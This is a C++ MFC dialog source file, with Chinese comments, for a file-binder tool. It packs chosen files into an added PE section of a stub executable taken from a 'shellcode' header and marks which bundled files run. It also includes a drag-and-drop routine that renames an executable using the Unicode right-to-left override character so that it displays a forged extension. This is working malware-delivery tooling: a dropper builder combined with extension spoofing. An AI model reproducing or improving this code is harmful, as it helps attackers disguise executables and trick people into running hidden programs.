// CBundleDlg.cpp: 实现文件
//

#include "pch.h"
#include "nbclass.h"
#include "CBundleDlg.h"
#include "afxdialogex.h"
#include"../shellcode/bundle.H"




// CBundleDlg 对话框

IMPLEMENT_DYNAMIC(CBundleDlg, CDialogEx)


CBundleDlg::CBundleDlg(CWnd* pParent)
	: CDialogEx(IDD_BUNDLEDLG, pParent)
{
}

CBundleDlg::~CBundleDlg()
{
}




void CBundleDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST1, m_Filelist);
	DDX_Control(pDX, IDC_EDITPATH, m_path);
	
}

BEGIN_MESSAGE_MAP(CBundleDlg, CDialogEx)
	ON_BN_CLICKED(IDC_BUTTON3, &CBundleDlg::OnBnClickedButton3)
	ON_BN_CLICKED(IDC_BUTTON1, &CBundleDlg::OnBnClickedButton1)
	ON_WM_DROPFILES()
END_MESSAGE_MAP()


// CBundleDlg 消息处理程序
PVOID CBundleDlg::AddSection(PBYTE Filebuff, DWORD Sectionsize, PDWORD buffsize)
{
	//设置PE结构
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)Filebuff;
	PIMAGE_FILE_HEADER pPeHeader = (PIMAGE_FILE_HEADER)(Filebuff + 4 + pDosHeader->e_lfanew);
	if (pPeHeader->SizeOfOptionalHeader == 0xE0)
		is64 = FALSE;
	else
		is64 = TRUE;
	PIMAGE_OPTIONAL_HEADER32 OpHeader32 = (PIMAGE_OPTIONAL_HEADER32)((DWORD_PTR)pPeHeader + IMAGE_SIZEOF_FILE_HEADER);
	PIMAGE_OPTIONAL_HEADER64 OpHeader64 = (PIMAGE_OPTIONAL_HEADER64)OpHeader32;
	PIMAGE_SECTION_HEADER Section = (PIMAGE_SECTION_HEADER)((DWORD_PTR)pPeHeader + pPeHeader->SizeOfOptionalHeader + IMAGE_SIZEOF_FILE_HEADER);
	//填充新节信息
	PIMAGE_SECTION_HEADER LocalSection = Section + pPeHeader->NumberOfSections;
	RtlCopyMemory(LocalSection->Name, ".bhyy", strlen(".bhyy") + 1);
	//设置节文件大小和内存大小
	LocalSection->Misc.VirtualSize = Sectionsize;
	LocalSection->SizeOfRawData = Sectionsize;
	//内存起始地址(保持内存对齐)
	LocalSection->VirtualAddress = GetAlignmentSize(is64 ? OpHeader64->SectionAlignment : OpHeader32->SectionAlignment, (Section + pPeHeader->NumberOfSections - 1)->VirtualAddress + (Section + pPeHeader->NumberOfSections - 1)->Misc.VirtualSize);
	//设置在文件起始地址
	LocalSection->PointerToRawData = GetAlignmentSize(is64 ? OpHeader64->FileAlignment : OpHeader32->FileAlignment, (Section + pPeHeader->NumberOfSections - 1)->PointerToRawData + (Section + pPeHeader->NumberOfSections - 1)->SizeOfRawData);
	LocalSection->Characteristics = IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_INITIALIZED_DATA;
	//设置增加节后的个数
	pPeHeader->NumberOfSections += 1;
	//设置镜像大小（务必内存对齐）
	DWORD SizeofImage = GetAlignmentSize(is64 ? OpHeader64->SectionAlignment : OpHeader32->SectionAlignment, LocalSection->VirtualAddress + LocalSection->Misc.VirtualSize);
	if (is64)
		OpHeader64->SizeOfImage = SizeofImage;
	else
		OpHeader32->SizeOfImage = SizeofImage;
	//开始拷贝到新内存
	DWORD buffSize = GetAlignmentSize(is64 ? OpHeader64->FileAlignment : OpHeader32->FileAlignment, LocalSection->PointerToRawData + LocalSection->SizeOfRawData);
	PVOID buff = malloc(buffSize);
	if (!buff)
		return 0;
	memset(buff, 0, buffSize);
	RtlCopyMemory(buff, Filebuff, LocalSection->PointerToRawData);
	*buffsize = buffSize;
	free(Filebuff);
	return buff;
}

PVOID CBundleDlg::GetFileToBuff(char* fileName, PDWORD size)
{
	PVOID buff = NULL;
	HANDLE hFile = NULL;
	DWORD lpNumberOfBytesRead;
	//打开文件，此文件必须是存在的
	hFile = CreateFileA(fileName, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		*size = GetFileSize(hFile, NULL);

		buff = malloc(*size);
		if (buff)
		{
			//读取失败释放内存
			if (!ReadFile(hFile, buff, *size, &lpNumberOfBytesRead, 0))
			{
				free(buff);
				buff = 0;
			}
		}

		CloseHandle(hFile);
	}

	return buff;
}

DWORD CBundleDlg::GetAlignmentSize(DWORD Alignment, DWORD Size)
{
	DWORD AlignmentSize = 0;
	DWORD  num = 0;

	while ((num = (Size + AlignmentSize) % Alignment) != 0)
	{
		AlignmentSize++;
	}

	return AlignmentSize + Size;
}

//点击导入
void CBundleDlg::OnBnClickedButton1()
{
	CFolderPickerDialog dlg;
	if (dlg.DoModal() != IDOK)
		return;

	//遍历该文件夹
	CFileFind finder;
	BOOL isNotEmpty = finder.FindFile((dlg.GetPathName() + _T("\\*.*"))); //总文件夹，开始遍历 
	while (isNotEmpty)
	{
		isNotEmpty = finder.FindNextFile();//查找文件 
		CString filename = finder.GetFileName();//获取文件的路径，可能是文件夹，可能是文件 
		if (!finder.IsDirectory())//如果是文件则加入文件列表 
		{	
			if ((filename != _T(".")) && (filename != _T("..")))
			{
				m_Filelist.AddString(finder.GetFilePath());
			}
		}
	}
}

//获取信息
DWORD CBundleDlg::SetFileInfo(CArray<PBYTE>* bufflist, BUNDLEINFO** FileInfo)
{
	DWORD				FileConut;				//捆绑文件总数
	DWORD				Size = 0;					//总大小
	MYFILEINFO*			Myfileinfo = NULL;
	CString				data;
	FileConut = m_Filelist.GetCount();
	





	Size = sizeof(MYFILEINFO) * FileConut + sizeof(DWORD);
	*FileInfo = (BUNDLEINFO*)LocalAlloc(LPTR, Size);
	if (*FileInfo == NULL)
		return 0;
	
	//设置总数
	(*FileInfo)->Conut = FileConut;
	//开始填写结构
	Myfileinfo = (MYFILEINFO*)(((DWORD_PTR)*FileInfo) + 4);

	for (size_t i = 0; i < FileConut; i++, Myfileinfo++)
	{
		PBYTE buff = NULL;
		//获取列中文件完整路径
		m_Filelist.GetText(i, data);
		//打开文件
		CFile file(data.GetBuffer(), CFile::modeRead|CFile::typeBinary);
		//获取文件大小
		Myfileinfo->FileSize = file.GetLength();
		Size += Myfileinfo->FileSize;
		//读取文件
		buff = (PBYTE)LocalAlloc(LPTR, Myfileinfo->FileSize);
		file.Read(buff, Myfileinfo->FileSize);
		file.Close();
		//将申请的内存加入到列表
		bufflist->Add(buff);

		//设置释放路径
		CString tmp;
		m_path.GetWindowTextA(tmp);
		tmp += "\\"; tmp += PathFindFileNameA(data.GetBuffer());

		strcat_s((char*)&Myfileinfo->name,MAX_PATH ,tmp.GetBuffer());
		//判断系统类型
		if (i == m_Filelist.GetCurSel())
		{
			Myfileinfo->RunType = 1;
			continue;
		}

		data = PathFindExtensionA(data.GetBuffer());
		if (data.Compare(".exe") == 0)
		{
			Myfileinfo->RunType = 2;
		}
	}

	return Size;
}

void CBundleDlg::SaveFile(PVOID buff, DWORD size)
{

	CFileDialog dlg(FALSE, "exe", 0, OFN_OVERWRITEPROMPT, "可执行程序(*.exe)|*.exe||", this);
	if (dlg.DoModal() != IDOK)
		return;

	DWORD lpNumberOfBytesWritten;
	HANDLE pFile = CreateFileA(dlg.GetPathName().GetBuffer(), GENERIC_READ | GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	WriteFile(pFile, buff, size, &lpNumberOfBytesWritten, 0);
	CloseHandle(pFile);
	MessageBoxA("捆绑完成","提示");
}

//点击捆绑
void CBundleDlg::OnBnClickedButton3()
{
	CString				data;					//字符串
	CArray<PBYTE>		buff;					//文件缓冲区
	BUNDLEINFO*			FileInfo = NULL;		//文件信息描述结构
	DWORD				SumSize = 0;			//信息总大小（也就是需要节的大小）
	DWORD				buffsize = 0;			//增加节后文件的大小
	PBYTE				FileBuff = NULL;		//增加节后的文件缓冲区

	//判断信息是否添加完整
	m_path.GetWindowTextA(data);
	if (data.IsEmpty())
	{
		MessageBoxA("输出路径未配置", "警告");
		return;
	}

	if (m_Filelist.GetCurSel() == -1)
	{
		MessageBoxA("列表框无选中文件", "警告");
		return;
	}

	//填写信息
	SumSize = SetFileInfo(&buff, &FileInfo);
	//增加节
	FileBuff = (PBYTE)malloc(sizeof(bundleData));
	RtlCopyMemory(FileBuff, bundleData, sizeof(bundleData));
	FileBuff = (PBYTE)AddSection(FileBuff, SumSize, &buffsize);

	//将数据都拷贝到节中
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)FileBuff;
	PIMAGE_FILE_HEADER pPeHeader = (PIMAGE_FILE_HEADER)(FileBuff + 4 + pDosHeader->e_lfanew);
	PIMAGE_OPTIONAL_HEADER64 OpHeader64 = (PIMAGE_OPTIONAL_HEADER64)((DWORD_PTR)pPeHeader + IMAGE_SIZEOF_FILE_HEADER);
	PIMAGE_SECTION_HEADER Section = (PIMAGE_SECTION_HEADER)((DWORD_PTR)pPeHeader + pPeHeader->SizeOfOptionalHeader + IMAGE_SIZEOF_FILE_HEADER);
	Section += pPeHeader->NumberOfSections - 1;

	MYFILEINFO* myfile = (MYFILEINFO*)((DWORD_PTR)FileInfo + sizeof(DWORD));
	DWORD Offset = sizeof(MYFILEINFO) * FileInfo->Conut + sizeof(DWORD);
	//拷贝开始结构
	RtlCopyMemory(Section->PointerToRawData + FileBuff, FileInfo, Offset);
	for (size_t i = 0; i < FileInfo->Conut; i++)
	{
		RtlCopyMemory((char*)(Section->PointerToRawData + FileBuff + Offset), buff.GetAt(i), myfile[i].FileSize);
		Offset += myfile[i].FileSize;
	}

	//释放缓冲区
	for (size_t i = 0; i < buff.GetCount(); i++)
		LocalFree(buff.GetAt(i));
	LocalFree(FileInfo);
	//保存文件
	SaveFile(FileBuff, buffsize);
	free(FileBuff);
}


void CBundleDlg::OnDropFiles(HDROP hDropInfo)
{
	//获取推拽文件的完整路径
	WCHAR path[MAX_PATH] = { 0 };
	DragQueryFileW(hDropInfo,0,path, MAX_PATH);

	WORD RLO = 0x202E;
	CString pathName;

	//获取文件的路径
	WCHAR OutFilePath[MAX_PATH] = { 0 };
	PathRemoveFileSpecW(path);
	wcscat(OutFilePath, path);
	
	//重新获取一下拖入的文件因为刚刚破坏了
	DragQueryFileW(hDropInfo, 0, path, MAX_PATH);


	//获取要伪造的后缀名
	m_Filelist.GetText(m_Filelist.GetCurSel(), pathName);

	//组合新文件名
	wcscat(OutFilePath, L"\\qw");
	OutFilePath[wcslen(OutFilePath)] = RLO;
	//获取伪造的后缀名
	pathName = PathFindExtensionA(pathName);
	char* hou = pathName.GetBuffer();
	DWORD len = wcslen(OutFilePath);
	for (size_t i = 0; i < pathName.GetLength(); i++)
	{
		OutFilePath[len + i] = hou[pathName.GetLength() - i - 1];
	}
	wcscat(OutFilePath, L"exe");
	MoveFileW(path, OutFilePath);
	CDialogEx::OnDropFiles(hDropInfo);
}
